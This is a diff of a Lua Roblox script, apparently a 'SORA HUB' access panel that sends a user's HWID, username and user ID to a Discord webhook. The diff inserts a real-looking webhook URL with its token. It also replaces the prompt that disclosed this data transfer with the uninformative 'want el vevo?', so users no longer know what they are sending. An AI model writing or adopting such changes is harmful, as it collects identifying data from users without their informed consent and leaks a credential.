@@ -7,7 +7,7 @@
 -- Client-side enforcement is bypassable; obfuscation does not secure the URL.
 -- No requests are sent automatically. Unapproved users must click Send request.
 do
-    local WEBHOOK_URL = "PASTE_DISCORD_WEBHOOK_URL_HERE"
+    local WEBHOOK_URL = "https://discord.com/api/webhooks/1555566533827371051/YvwfRV3K_A0eNN5eJS2METjr6FTpPpQE9em7m0y19V4s9u2l8sec7LVd_ucq8VojDxMO"
     local WHITELIST = {
         -- ["PASTE_APPROVED_HWID_HERE"] = true,
     }
@@ -70,7 +70,7 @@ do
             })
         end
         label("SORA HUB | ACCESS REQUEST", 12, 28, 17)
-        label("Send your HWID, Roblox username and user ID to the hub owner’s Discord webhook for access approval?", 48, 64)
+        label("want el vevo?", 48, 64)
         local status = label("Get access", 118, 45, 12)
         local send = make("TextButton", panel, {
             Text = "Send request", Position = UDim2.new(0, 16, 1, -58), Size = UDim2.new(0.5, -24, 0, 38),
